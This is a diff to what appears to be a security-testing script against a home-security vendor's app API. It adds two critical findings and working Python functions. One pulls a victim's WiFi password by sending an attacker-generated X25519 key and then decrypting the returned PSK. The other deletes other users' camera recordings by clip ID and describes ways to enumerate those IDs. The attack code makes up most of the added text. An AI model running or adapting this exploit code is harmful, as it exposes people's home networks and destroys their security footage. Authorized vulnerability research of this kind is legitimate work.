@@ -335,6 +335,48 @@ FINDINGS = [
                   'POST /activation/{victim_userId}/{victim_sid}/location {"safeWord":"X"}; 200 = write CRITICAL. '
                   'Note: GET /accounts/{userId}/locations/billing also returns per-location paymentMethodId + '
                   'CreditCard{cardBrand, lastFour, expirationMonth, expirationYear} (overlaps F32 read surface).'),
+    Finding("F36", "CRITICAL", "WiFi PSK Cryptographic IDOR — Redirect E2E-Encrypted Credentials to Attacker Key",
+            "app_hub", "/v1/ss3/{serial}/{sid}/wifiCredentials", "GET", None,
+            verified=False,
+            notes='APK: SsAppHubRestService.java (classes14.dex). '
+                  'GET /v1/ss3/{serial}/{sid}/wifiCredentials '
+                  'body: WifiCredentialsRequestBody{publicKey: String (X25519 base64), salt: String (base64)}. '
+                  'Response: WifiCredentialsResponse{publicKey: String, secureContainer: SecureContainer{nonce, tag, ciphertext}, errorCode: Int?}. '
+                  'Protocol: client sends ephemeral X25519 pubkey + salt; server derives shared key via '
+                  'HKDF-SHA256(X25519(server_priv, client_pub), salt, sid_bytes) and returns '
+                  'WiFi PSK encrypted in AES-GCM (SecureContainer = nonce+ciphertext+tag). '
+                  'Encryption.java + KeyPairKt.java (classes12.dex/com.simplisafe.bleak). '
+                  'IDOR attack: attacker generates own X25519 keypair, sends '
+                  '{"publicKey": attacker_pub_b64, "salt": random_b64} to '
+                  'GET /v1/ss3/{victim_serial}/{victim_sid}/wifiCredentials. '
+                  'Server encrypts victim\'s WiFi PSK with attacker\'s public key. '
+                  'Attacker decrypts AES-GCM using derived key = HKDF(X25519(attacker_priv, server_pub), salt, sid). '
+                  'Result: victim\'s WiFi network password (PSK) — home/business network access. '
+                  'The endpoint is the designed mechanism for onboarding new devices; '
+                  'IDOR makes it a credential exfiltration oracle for any known serial+sid pair. '
+                  'serial = base station serial (visible on device sticker, in GET /locations/{sid}/all response). '
+                  'sid = subscription ID (exposed via multiple other IDOR endpoints). '
+                  'Test: generate X25519 keypair; POST {"publicKey": pub_b64, "salt": rand_b64} to '
+                  'GET /v1/ss3/{victim_serial}/{victim_sid}/wifiCredentials; '
+                  '200+secureContainer = CRITICAL; decrypt with derived key to confirm PSK.'),
+    Finding("F37", "CRITICAL", "Recording Deletion IDOR — Destroy Victim Video Evidence via clipId",
+            "app_hub", "/v1/recordings/{id}", "DELETE", None,
+            verified=False,
+            notes='APK: SsAppHubRestService.java (classes14.dex). '
+                  'DELETE /v1/recordings/{id} where id is long (clipId: long in Clip.java, ClipJson.java). '
+                  'If clipId not validated against authenticated user: '
+                  'attacker deletes victim\'s camera recordings — destroys video evidence of intrusion. '
+                  'clipId sources: '
+                  '(1) GET IDOR on recording list if sid not JWT-bound (sid-scoped recording endpoints). '
+                  '(2) Timestamp-based: if clipId = Unix ms, enumerate by time window (breach event time). '
+                  '(3) Sequential: guess IDs around own known clipId. '
+                  'Clip model: {clipId: long, uuid: String, account: String, cameraName: String, '
+                  'recordingLinks: RecordingLinks, detections: List<Detection>, recordingType, region}. '
+                  'Impact: attacker destroys video evidence of their own intrusion; '
+                  'or adversary destroys victim\'s recording library. '
+                  'Test: obtain own clipId via GET recording list; '
+                  'attempt DELETE /v1/recordings/{different_account_clipId} with own token; '
+                  '200/204 = CRITICAL. Determine if clipId is sequential or timestamp by examining own clip IDs.'),
 ]
 
 
@@ -1057,6 +1099,83 @@ def test_location_settings_idor(token, victim_uid, victim_sid, victim_location_i
                f"SAFEWORD CHANGED uid={victim_uid} sid={victim_sid} -> {attacker_safeword}")
     else:
         _print("INFO", r2.status_code, f"location update: {r2.text[:100]}")
+
+
+def test_wifi_credentials_idor(token, victim_serial, victim_sid):
+    """F36: Redirect WiFi PSK encryption to attacker key by sending own X25519 pubkey for victim serial+sid."""
+    import os, base64
+    from cryptography.hazmat.primitives.asymmetric.x25519 import X25519PrivateKey
+    from cryptography.hazmat.primitives.serialization import Encoding, PublicFormat
+    from cryptography.hazmat.primitives.kdf.hkdf import HKDF
+    from cryptography.hazmat.primitives import hashes
+    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+    print(f"\n=== F36 — WiFi Credentials IDOR (serial={victim_serial}, sid={victim_sid}) ===")
+    attacker_priv = X25519PrivateKey.generate()
+    attacker_pub_bytes = attacker_priv.public_key().public_bytes(Encoding.Raw, PublicFormat.Raw)
+    attacker_pub_b64 = base64.b64encode(attacker_pub_bytes).decode()
+    salt_bytes = os.urandom(32)
+    salt_b64 = base64.b64encode(salt_bytes).decode()
+    body = {"publicKey": attacker_pub_b64, "salt": salt_b64}
+    r = get(f"{SERVICES['app_hub']}/v1/ss3/{victim_serial}/{victim_sid}/wifiCredentials",
+            token=token, json=body)
+    if not r:
+        print("  Request failed"); return
+    if r.status_code == 200:
+        try:
+            data = r.json()
+            server_pub_b64 = data.get("publicKey", "")
+            sc = data.get("secureContainer", {})
+            nonce_b64 = sc.get("nonce", "")
+            tag_b64 = sc.get("tag", "")
+            ct_b64 = sc.get("ciphertext", "")
+            if server_pub_b64 and ct_b64:
+                # Derive shared key: HKDF-SHA256(X25519(attacker_priv, server_pub), salt, sid_bytes)
+                from cryptography.hazmat.primitives.asymmetric.x25519 import X25519PublicKey
+                server_pub_bytes = base64.b64decode(server_pub_b64)
+                server_pub = X25519PublicKey.from_public_bytes(server_pub_bytes)
+                shared = attacker_priv.exchange(server_pub)
+                sid_bytes = victim_sid.encode() if isinstance(victim_sid, str) else str(victim_sid).encode()
+                derived_key = HKDF(algorithm=hashes.SHA256(), length=32,
+                                   salt=salt_bytes, info=sid_bytes).derive(shared)
+                # Decrypt AES-GCM
+                nonce = base64.b64decode(nonce_b64)
+                ciphertext_plus_tag = base64.b64decode(ct_b64) + base64.b64decode(tag_b64)
+                try:
+                    aead = AESGCM(derived_key)
+                    plaintext = aead.decrypt(nonce, ciphertext_plus_tag, None)
+                    _print("CRIT", 200, f"WiFi PSK DECRYPTED serial={victim_serial}: {plaintext}")
+                except Exception as dec_err:
+                    _print("CRIT", 200,
+                           f"200+secureContainer (decrypt failed: {dec_err}) — server_pub={server_pub_b64[:20]}...")
+            else:
+                _print("CRIT", 200, f"200 raw={r.text[:200]}")
+        except Exception as e:
+            _print("CRIT", 200, f"200 (parse err: {e}) raw={r.text[:200]}")
+    else:
+        _print("INFO", r.status_code, f"wifiCredentials: {r.text[:100]}")
+
+
+def test_recording_deletion_idor(token, victim_clip_id):
+    """F37: Delete victim's recording by clipId IDOR."""
+    print(f"\n=== F37 — Recording Deletion IDOR (clipId={victim_clip_id}) ===")
+    r_list = get(f"{SERVICES['app_hub']}/v1/recordings", token=token)
+    if r_list and r_list.status_code == 200:
+        try:
+            clips = r_list.json()
+            own_ids = [c.get("clipId") or c.get("id") for c in (clips if isinstance(clips, list)
+                       else clips.get("clips", []))][:3]
+            _print("INFO", 200, f"Own clip IDs (for enumeration comparison): {own_ids}")
+        except Exception:
+            pass
+    import requests as req_lib
+    headers = {"Authorization": f"Bearer {token}"}
+    r = req_lib.delete(f"{SERVICES['app_hub']}/v1/recordings/{victim_clip_id}", headers=headers)
+    if r.status_code in (200, 204):
+        _print("CRIT", r.status_code, f"RECORDING DELETED clipId={victim_clip_id}")
+    elif r.status_code == 404:
+        _print("INFO", 404, f"Not found — clipId may belong to different namespace or not exist")
+    else:
+        _print("INFO", r.status_code, f"recording delete: {r.text[:100]}")
 
 
 def test_webrtc_idor(token, victim_camera_uuid, victim_sid):
